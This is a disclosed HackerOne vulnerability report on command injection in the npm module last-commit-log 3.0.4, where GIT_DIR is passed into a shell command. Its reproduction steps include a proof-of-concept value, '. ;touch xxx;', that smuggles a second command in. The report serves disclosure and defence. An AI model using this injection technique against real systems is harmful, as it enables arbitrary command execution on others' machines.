# [H] [last-commit-log] Command Injection

## Summary
Severity: High (CVSS 7.0)
Program: Node.js third-party modules
Weakness: Command Injection - Generic
Reporter: bilk0h
State: resolved
Disclosed: 2020-11-29T11:06:29.469Z
Source: https://hackerone.com/reports/881713

## Details
I would like to report `Command Injection` in `last-commit-log`
It allows `execution of arbitrary commands`

# Module

**module name:** `last-commit-log`
**version:** `last-commit-log@3.0.4`
**npm page:** `https://www.npmjs.com/package/last-commit-log`

## Module Description

Node.js module to get the last git commit information - mostly to be used by CI/CD and building phase.

## Module Stats

[3,253] downloads in the last week

# Vulnerability

The value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).

## Vulnerability Description

## Steps To Reproduce:
> npm i last-commit-log
>cat > test.js
const LCL = require('last-commit-log');
const lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default
>lcl
  .getLastCommit()
  .then(commit => console.log(commit));

Export malicious GIT_DIR string
>export GIT_DIR=". ;touch xxx;"

Run
>node test.js


_Trimmed to 38 lines — full report: https://hackerone.com/reports/881713_
